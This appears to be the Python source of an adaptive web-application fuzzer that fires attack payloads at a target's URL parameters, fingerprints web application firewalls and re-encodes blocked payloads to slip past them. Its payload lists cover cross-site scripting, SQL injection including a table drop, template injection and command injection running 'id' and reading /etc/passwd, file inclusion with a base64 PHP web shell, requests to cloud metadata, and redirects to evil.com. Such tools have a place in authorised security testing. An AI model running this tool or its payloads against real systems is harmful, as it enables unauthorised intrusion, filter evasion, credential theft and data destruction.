"""Smart adaptive fuzzer - Uses response analysis to adapt fuzzing strategy."""

import httpx
import re
import time
import hashlib
from urllib.parse import urlparse, urlencode, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field


@dataclass
class FuzzResult:
    """Represents a single fuzz test result."""
    param: str
    payload: str
    url: str
    status_code: int
    response_length: int
    response_time: float
    category: str  # 'interesting', 'blocked', 'normal'
    confidence: float
    evidence: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to JSON-serializable dict."""
        return {
            "param": self.param,
            "payload": self.payload,
            "url": self.url,
            "status_code": self.status_code,
            "response_length": self.response_length,
            "response_time": self.response_time,
            "category": self.category,
            "confidence": self.confidence,
            "evidence": self.evidence,
        }


class SmartFuzzer:
    """Adaptive fuzzer that learns from responses and adjusts strategy."""

    def __init__(self, threads: int = 10, timeout: int = 10, max_retries: int = 2):
        """
        Initialize SmartFuzzer.

        Args:
            threads: Number of concurrent threads.
            timeout: HTTP request timeout in seconds.
            max_retries: Maximum retries for failed requests.
        """
        self.threads = threads
        self.timeout = timeout
        self.max_retries = max_retries
        self.baseline: Optional[Dict[str, Any]] = None
        self.waf_detected = False
        self.blocked_payloads: List[str] = []
        self.successful_payloads: List[str] = []
        self.findings: List[Dict[str, Any]] = []

        # Payload categories
        self.payload_sets = {
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><svg/onload=alert(1)>",
                "'-alert(1)-'",
                "<details open ontoggle=alert(1)>",
                "javascript:alert(1)",
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
                "{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}",
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "admin'--",
                "1; DROP TABLE users--",
                "' AND SLEEP(5)--",
                "1' ORDER BY 1--",
                "' HAVING 1=1--",
                "' GROUP BY 1--",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{request.application.__globals__}}",
                "{% import os %}{{os.popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            "rce": [
                "; id",
                "| whoami",
                "$(id)",
                "`id`",
                "; cat /etc/passwd",
                "| ls -la",
                "&& whoami",
                "|| id",
                ";${IFS}id",
                "$(cat${IFS}/etc/passwd)",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
                "..%252f..%252f..%252fetc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/var/log/apache2/access.log",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            ],
            "ssrf": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]/",
                "http://0x7f000001/",
                "http://2130706433/",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:25/",
                "http://0.0.0.0/",
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "/\\evil.com",
                "//evil.com/%2f..",
                "///evil.com",
                "////evil.com",
                "https:evil.com",
                "http://evil.com@legitimate.com",
                "javascript:alert(1)//",
                "//evil.com?@legitimate.com",
            ],
        }

    def fuzz(self, url: str, params: List[str]) -> List[Dict[str, Any]]:
        """
        Perform intelligent adaptive fuzzing on target parameters.

        Args:
            url: Target URL to fuzz.
            params: List of parameter names to test.

        Returns:
            List of findings sorted by confidence score.
        """
        self.findings = []
        self.blocked_payloads = []
        self.successful_payloads = []
        print(f"[*] Smart fuzzing {len(params)} params on: {url}")

        # Phase 1: Analyze baseline
        print("[*] Phase 1: Analyzing baseline...")
        self.baseline = self._analyze_baseline(url)
        if not self.baseline:
            print("[-] Failed to get baseline. Aborting.")
            return self.findings

        print(f"[*] Baseline: status={self.baseline['status_code']}, "
              f"length={self.baseline['content_length']}, "
              f"time={self.baseline['response_time']:.2f}s")

        # Phase 2: Initial probe to detect WAF
        print("[*] Phase 2: Probing for WAF...")
        probe_results = self._probe_waf(url, params[0] if params else "test")
        self.waf_detected = self._detect_waf(probe_results)
        if self.waf_detected:
            print("[!] WAF detected! Adapting strategy...")

        # Phase 3: Fuzz each parameter with adaptive payloads
        print("[*] Phase 3: Fuzzing parameters...")
        for param in params:
            print(f"[*] Fuzzing param: {param}")
            param_results = self._fuzz_param(url, param)
            self.findings.extend(param_results)

        # Phase 4: Adapt and retry blocked payloads
        if self.blocked_payloads and self.waf_detected:
            print(f"[*] Phase 4: Adapting {len(self.blocked_payloads)} blocked payloads...")
            adapted = self._adapt_payloads(self.blocked_payloads)
            for param in params:
                for payload in adapted:
                    result = self._test_single(url, param, payload)
                    if result and result.category == "interesting":
                        self.findings.append(result.to_dict())

        # Sort by confidence
        self.findings.sort(key=lambda x: x.get("confidence", 0), reverse=True)
        print(f"[+] Smart fuzzing complete. Found {len(self.findings)} interesting results.")
        return self.findings

    def _analyze_baseline(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Get baseline response characteristics for comparison.

        Args:
            url: Target URL to baseline.

        Returns:
            Dict with baseline response characteristics.
        """
        try:
            with httpx.Client(timeout=self.timeout, verify=False, follow_redirects=False) as client:
                # Multiple requests to get stable baseline
                responses = []
                for _ in range(3):
                    start = time.time()
                    response = client.get(url)
                    elapsed = time.time() - start
                    responses.append({
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "response_time": elapsed,
                        "headers": dict(response.headers),
                        "body_hash": hashlib.md5(response.content).hexdigest(),
                        "body": response.text[:5000],
                    })

                # Use median values
                avg_length = sum(r["content_length"] for r in responses) // len(responses)
                avg_time = sum(r["response_time"] for r in responses) / len(responses)

                return {
                    "status_code": responses[0]["status_code"],
                    "content_length": avg_length,
                    "response_time": avg_time,
                    "headers": responses[0]["headers"],
                    "body_hash": responses[0]["body_hash"],
                    "body_sample": responses[0]["body"],
                    "stable": all(r["body_hash"] == responses[0]["body_hash"] for r in responses),
                }
        except Exception as e:
            print(f"[-] Baseline error: {e}")
            return None

    def _detect_waf(self, responses: List[Optional[httpx.Response]]) -> bool:
        """
        Detect if a WAF is blocking requests based on probe responses.

        Args:
            responses: List of responses from WAF probes.

        Returns:
            True if WAF is detected, False otherwise.
        """
        if not responses:
            return False

        waf_indicators = 0
        for response in responses:
            if response is None:
                continue

            # Check for WAF status codes
            if response.status_code in [403, 406, 429, 503]:
                waf_indicators += 1

            # Check for WAF headers
            waf_headers = ["x-sucuri", "x-cdn", "cf-ray", "x-akamai", "x-iinfo"]
            for header in waf_headers:
                if header in [h.lower() for h in response.headers.keys()]:
                    waf_indicators += 1

            # Check for WAF body signatures
            body = response.text.lower() if response.text else ""
            waf_bodies = ["blocked", "forbidden", "security", "firewall", "waf", "protection"]
            for sig in waf_bodies:
                if sig in body:
                    waf_indicators += 1
                    break

        return waf_indicators >= 2

    def _adapt_payloads(self, blocked_payloads: List[str]) -> List[str]:
        """
        Modify blocked payloads to bypass filters.

        Args:
            blocked_payloads: List of payloads that were blocked.

        Returns:
            List of adapted payloads with encoding/obfuscation applied.
        """
        adapted = []

        for payload in blocked_payloads:
            # URL encoding
            adapted.append(quote(payload, safe=""))

            # Double URL encoding
            adapted.append(quote(quote(payload, safe=""), safe=""))

            # Case variation
            mixed = ""
            for i, c in enumerate(payload):
                mixed += c.upper() if i % 2 == 0 else c.lower()
            adapted.append(mixed)

            # Whitespace substitution
            adapted.append(payload.replace(" ", "%09"))  # Tab
            adapted.append(payload.replace(" ", "%0a"))  # Newline
            adapted.append(payload.replace(" ", "/**/"))  # SQL comment

            # Null byte insertion
            adapted.append(payload + "%00")

            # Unicode encoding
            adapted.append("".join(f"%u{ord(c):04x}" if not c.isalnum() else c for c in payload))

            # HTML entity encoding for special chars
            html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
            adapted.append(html_encoded)

            # Concatenation tricks (for SQL)
            if "SELECT" in payload.upper():
                adapted.append(payload.replace("SELECT", "SEL/**/ECT"))
                adapted.append(payload.replace("UNION", "UN/**/ION"))

            # Tag tricks (for XSS)
            if "<script" in payload.lower():
                adapted.append(payload.replace("<script>", "<ScRiPt>"))
                adapted.append(payload.replace("<script>", "<script/x>"))
                adapted.append(payload.replace("alert", "prompt"))
                adapted.append(payload.replace("alert", "confirm"))

        return adapted

    def _categorize_response(
        self, response: httpx.Response, response_time: float
    ) -> Tuple[str, float, List[str]]:
        """
        Categorize a response as interesting, blocked, or normal.

        Args:
            response: HTTP response to categorize.
            response_time: Time taken for the response.

        Returns:
            Tuple of (category, confidence, evidence_list).
        """
        if not self.baseline:
            return ("normal", 0.0, [])

        evidence = []
        interesting_score = 0.0

        # Status code analysis
        if response.status_code != self.baseline["status_code"]:
            if response.status_code in [403, 406, 429, 503]:
                return ("blocked", 0.9, [f"Blocked with status {response.status_code}"])
            elif response.status_code == 500:
                interesting_score += 0.4
                evidence.append(f"Server error: {response.status_code}")
            elif response.status_code in [200, 301, 302]:
                interesting_score += 0.2
                evidence.append(f"Status changed: {self.baseline['status_code']} -> {response.status_code}")

        # Content length analysis
        current_length = len(response.content)
        baseline_length = self.baseline["content_length"]
        if baseline_length > 0:
            length_ratio = abs(current_length - baseline_length) / baseline_length
            if length_ratio > 0.5:
                interesting_score += 0.3
                evidence.append(f"Significant length change: {length_ratio:.0%}")
            elif length_ratio > 0.2:
                interesting_score += 0.15
                evidence.append(f"Length change: {length_ratio:.0%}")

        # Response time analysis (potential time-based injection)
        if response_time > self.baseline["response_time"] * 3:
            interesting_score += 0.4
            evidence.append(f"Slow response: {response_time:.2f}s (baseline: {self.baseline['response_time']:.2f}s)")

        # Error detection in body
        body = response.text.lower() if response.text else ""
        error_patterns = [
            (r"sql\s*(syntax|error|exception)", 0.5, "SQL error detected"),
            (r"(mysql|postgresql|oracle|sqlite)\s*error", 0.5, "Database error"),
            (r"stack\s*trace|traceback", 0.4, "Stack trace exposed"),
            (r"(undefined|null)\s*(variable|index|property)", 0.3, "Code error"),
            (r"(warning|notice|fatal):", 0.3, "Application warning/error"),
            (r"root:.*:0:0:", 0.8, "File content exposed (/etc/passwd)"),
            (r"\[boot loader\]", 0.7, "Windows file exposed"),
            (r"<\?php|<\?=", 0.6, "PHP source exposed"),
        ]

        for pattern, score, desc in error_patterns:
            if re.search(pattern, body):
                interesting_score += score
                evidence.append(desc)

        # Reflection detection
        # (simplified - in real use, check if payload is in response)
        if "alert(" in body or "onerror=" in body:
            interesting_score += 0.5
            evidence.append("Potential XSS reflection")

        # Categorize
        if interesting_score >= 0.4:
            return ("interesting", min(interesting_score, 1.0), evidence)
        elif interesting_score > 0:
            return ("normal", interesting_score, evidence)
        else:
            return ("normal", 0.0, [])

    def _fuzz_param(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Fuzz a single parameter with all payload categories."""
        results = []

        for category, payloads in self.payload_sets.items():
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                for payload in payloads:
                    future = executor.submit(self._test_single, url, param, payload)
                    futures[future] = (payload, category)

                for future in as_completed(futures):
                    payload, cat = futures[future]
                    try:
                        result = future.result()
                        if result:
                            if result.category == "interesting":
                                result_dict = result.to_dict()
                                result_dict["payload_category"] = cat
                                results.append(result_dict)
                            elif result.category == "blocked":
                                self.blocked_payloads.append(payload)
                    except Exception:
                        pass

        return results

    def _test_single(self, url: str, param: str, payload: str) -> Optional[FuzzResult]:
        """Test a single payload against a parameter."""
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        existing_params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(existing_params, doseq=True)}"

        try:
            with httpx.Client(timeout=self.timeout, verify=False, follow_redirects=False) as client:
                start = time.time()
                response = client.get(test_url)
                elapsed = time.time() - start

                category, confidence, evidence = self._categorize_response(response, elapsed)

                return FuzzResult(
                    param=param,
                    payload=payload,
                    url=test_url,
                    status_code=response.status_code,
                    response_length=len(response.content),
                    response_time=elapsed,
                    category=category,
                    confidence=confidence,
                    evidence=evidence,
                )
        except Exception:
            return None

    def _probe_waf(self, url: str, param: str) -> List[Optional[httpx.Response]]:
        """Send probe requests to detect WAF presence."""
        probes = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "; cat /etc/passwd",
        ]

        responses = []
        for probe in probes:
            try:
                parsed = urlparse(url)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(probe)}"
                with httpx.Client(timeout=self.timeout, verify=False, follow_redirects=False) as client:
                    response = client.get(test_url)
                    responses.append(response)
            except Exception:
                responses.append(None)

        return responses
